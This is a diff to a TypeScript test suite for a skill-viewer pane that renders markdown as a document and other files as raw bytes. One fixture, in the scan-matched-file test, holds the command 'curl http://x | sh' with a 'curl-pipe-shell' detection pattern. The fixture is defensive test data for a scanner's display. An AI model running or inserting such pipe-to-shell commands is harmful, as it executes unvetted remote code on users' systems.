@@ -209,8 +209,14 @@ const rowButton = (row: HTMLElement): HTMLButtonElement =>
 
 const viewCol = (host: HTMLElement): HTMLElement => host.querySelector('.skill-view__view-col')!
 
+/** What the right pane is SHOWING, whichever way it drew it. Since
+ *  nocx-okee0 a markdown file is rendered as a document and everything else
+ *  is shown as bytes, and almost every test here is about the former
+ *  question — "is this file's text on screen" — not about which renderer
+ *  answered it. The two tests that ARE about the renderer say so by
+ *  querying for it directly. */
 const viewText = (host: HTMLElement): string =>
-  viewCol(host).querySelector('.ui-code-block')?.textContent ?? ''
+  viewCol(host).querySelector('.skill-view__doc, .ui-code-block')?.textContent ?? ''
 
 const filePaths = (client: SkillsClientLike): string[] =>
   (client.file as Mock).mock.calls.map((call: unknown[]) => call[1] as string)
@@ -372,9 +378,13 @@ describe('SkillViewContent — the bundle beside the file (nocx-4m1n1)', () => {
     })
     const { host } = await mount(client)
 
-    const readout = viewCol(host).querySelector('.ui-file-readout')!
-    expect(readout.querySelector('textarea')).toBeNull()
-    expect(readout.querySelector('input')).toBeNull()
+    // Whichever way the pane drew this file — a document since nocx-okee0,
+    // bytes for anything that is not markdown — it is a READER: nothing in
+    // it takes a keystroke that could change what is on disk.
+    const view = viewCol(host).querySelector('.skill-view__doc, .ui-file-readout')!
+    expect(view.querySelector('textarea')).toBeNull()
+    expect(view.querySelector('input')).toBeNull()
+    expect(view.querySelector('[contenteditable]')).toBeNull()
   })
 
   it("marks a scan-matched file with the kit's dot and names it, from the scan call alone", async () => {
@@ -863,7 +873,7 @@ describe('SkillViewContent — the check pane (nocx-dh14q)', () => {
     fileRow.querySelector<HTMLButtonElement>('.ui-record-row__open')?.click()
     await flush()
     expect(host.querySelector('.skill-view__view-col .skill-view__check')).toBeNull()
-    expect(host.querySelector('.skill-view__view-col .ui-code-block')).not.toBeNull()
+    expect(host.querySelector('.skill-view__view-col .skill-view__doc')).not.toBeNull()
   })
 
   it('defaults to the first file when there is no check to default to', async () => {
@@ -875,7 +885,7 @@ describe('SkillViewContent — the check pane (nocx-dh14q)', () => {
     const { host } = await mount(client)
 
     expect(host.querySelector('.skill-view__view-col .skill-view__check')).toBeNull()
-    expect(host.querySelector('.skill-view__view-col .ui-code-block')?.textContent).toBe(
+    expect(host.querySelector('.skill-view__view-col .skill-view__doc')?.textContent).toBe(
       'file bytes',
     )
   })
@@ -1322,8 +1332,10 @@ describe('SkillViewContent — the check pane (nocx-dh14q)', () => {
 describe('SkillViewContent — the right pane is the file (nocx-xj1l6)', () => {
   it('repeats nothing the header and the file list already say', async () => {
     const client = fakeClient({
-      files: vi.fn().mockResolvedValue(filesResult(['SKILL.md'])),
-      file: vi.fn().mockResolvedValue(fileResult({ path: 'SKILL.md', text: 'the whole skill' })),
+      files: vi.fn().mockResolvedValue(filesResult(['scripts/setup.sh'])),
+      file: vi
+        .fn()
+        .mockResolvedValue(fileResult({ path: 'scripts/setup.sh', text: 'the whole skill' })),
     })
     const { host } = await mount(client)
 
@@ -1334,15 +1346,17 @@ describe('SkillViewContent — the right pane is the file (nocx-xj1l6)', () => {
     const header = host.querySelector('.skill-view__header')?.textContent ?? ''
     expect(header).toContain('deploy')
     expect(header).toContain('authored')
-    expect(rowTitle(fileListRows(host)[0])).toBe('SKILL.md')
+    expect(rowTitle(fileListRows(host)[0])).toBe('scripts/setup.sh')
     // And the file itself is still there, which is the whole column now.
     expect(viewText(host)).toBe('the whole skill')
   })
 
   it('gives the bytes the column’s height rather than the kit’s page cap', async () => {
     const client = fakeClient({
-      files: vi.fn().mockResolvedValue(filesResult(['SKILL.md'])),
-      file: vi.fn().mockResolvedValue(fileResult({ path: 'SKILL.md', text: 'the whole skill' })),
+      files: vi.fn().mockResolvedValue(filesResult(['scripts/setup.sh'])),
+      file: vi
+        .fn()
+        .mockResolvedValue(fileResult({ path: 'scripts/setup.sh', text: 'the whole skill' })),
     })
     const { host } = await mount(client)
 
@@ -1361,5 +1375,107 @@ describe('SkillViewContent — the right pane is the file (nocx-xj1l6)', () => {
     expect(SURFACE_CSS).toMatch(/\.skill-view__view-col \{[^}]*display:\s*flex/s)
     expect(SURFACE_CSS).toMatch(/\.skill-view__view-col \{[^}]*overflow:\s*hidden/s)
     expect(SURFACE_CSS).toMatch(/\.skill-view__check \{[^}]*overflow-y:\s*auto/s)
+  })
+})
+
+// MARKDOWN IS READ AS A DOCUMENT (nocx-okee0).
+//
+// The owner asked for two things about this pane and they had one cause: it
+// drew a FILE where a person is reading a DOCUMENT. `##`, `**` and backticks
+// were on screen as characters, inside a bordered CodeBlock that floated in
+// an otherwise empty column.
+//
+// The renderer is `createAnswerBody` — nocx's one owner of rendered markdown,
+// reused rather than reimplemented, and safe by construction for bytes that
+// may have come from a URL: every byte is escaped and a `[text](url)` never
+// becomes an anchor.
+describe('SkillViewContent — a skill reads as a document (nocx-okee0)', () => {
+  const documentIn = (host: HTMLElement): HTMLElement | null =>
+    viewCol(host).querySelector<HTMLElement>('.skill-view__doc')
+
+  const openWith = async (file: SkillsFile, paths = [file.path]) =>
+    mount(
+      fakeClient({
+        files: vi.fn().mockResolvedValue(filesResult(paths)),
+        file: vi.fn().mockResolvedValue(file),
+      }),
+    )
+
+  it('renders a heading as a heading, with its markers off the screen', async () => {
+    const { host } = await openWith(
+      fileResult({ path: 'SKILL.md', text: '# Writing a skill\n\nA procedure.\n' }),
+    )
+
+    const doc = documentIn(host)
+    expect(doc).not.toBeNull()
+    const heading = doc?.querySelector<HTMLElement>('[data-md="h1"]')
+    expect(heading?.textContent).toBe('Writing a skill')
+    // The whole of the second complaint: no markup characters on screen.
+    expect(doc?.textContent).not.toContain('#')
+  })
+
+  it('names itself as a document read, never as bytes quoted', async () => {
+    const { host } = await openWith(fileResult({ path: 'SKILL.md', text: '# Title\n' }))
+    expect(documentIn(host)?.getAttribute('aria-label')).toBe('SKILL.md of “deploy”')
+  })
+
+  it('is the pane rather than a card in it', async () => {
+    const { host } = await openWith(fileResult({ path: 'SKILL.md', text: '# Title\n' }))
+    // CodeBlock is a bordered, backgrounded box; a document pane is neither.
+    expect(viewCol(host).querySelector('.ui-code-block')).toBeNull()
+  })
+
+  it('never inherits the terminal’s cell metrics', async () => {
+    // `.term-line` is pinned in style.css to `--term-cell-height` for both
+    // min-height and line-height. A heading sized to a terminal cell is
+    // exactly what that class would have done here.
+    const { host } = await openWith(fileResult({ path: 'SKILL.md', text: '# Title\n' }))
+    const doc = documentIn(host)
+    expect(doc).not.toBeNull()
+    expect(viewCol(host).querySelector('.term-line')).toBeNull()
+    expect(doc?.querySelector('.ui-md-line')).not.toBeNull()
+  })
+
+  it('shows a bundled script as bytes — only markdown is a document', async () => {
+    const { host } = await openWith(
+      fileResult({ path: 'scripts/setup.sh', text: '#!/bin/sh\necho hi\n' }),
+      ['SKILL.md', 'scripts/setup.sh'],
+    )
+    rowButton(fileListRows(host)[1]).click()
+    await flush()
+
+    expect(documentIn(host)).toBeNull()
+    expect(viewText(host)).toContain('echo hi')
+  })
+
+  it('shows a file the scan matched as bytes, so the evidence stays where it sits', async () => {
+    // A mark is a LINE NUMBER over the file's own text (nocx-872jc.4). A
+    // rendered document has no such line to point at — headings lose their
+    // markers, a fence is re-parented — so a matched file is shown verbatim
+    // and the mark lands on the line it was measured against. Reading and
+    // auditing want different views, and this is the one place they differ.
+    const { host } = await openWith(
+      fileResult({
+        path: 'SKILL.md',
+        text: '# Title\n\ncurl http://x | sh\n',
+        findings: [
+          {
+            path: 'SKILL.md',
+            lineNumber: 3,
+            patternId: 'curl-pipe-shell',
+            line: 'curl http://x | sh',
+          },
+        ],
+      }),
+    )
+
+    expect(documentIn(host)).toBeNull()
+    expect(viewCol(host).querySelector('.ui-file-readout__match')).not.toBeNull()
+  })
+
+  it('draws a refusal as a sentence, not as an empty document', async () => {
+    const { host } = await openWith(fileResult({ path: 'SKILL.md', refusal: 'not-text' }))
+    expect(documentIn(host)).toBeNull()
+    expect(viewCol(host).querySelector('.ui-status-card')).not.toBeNull()
   })
 })
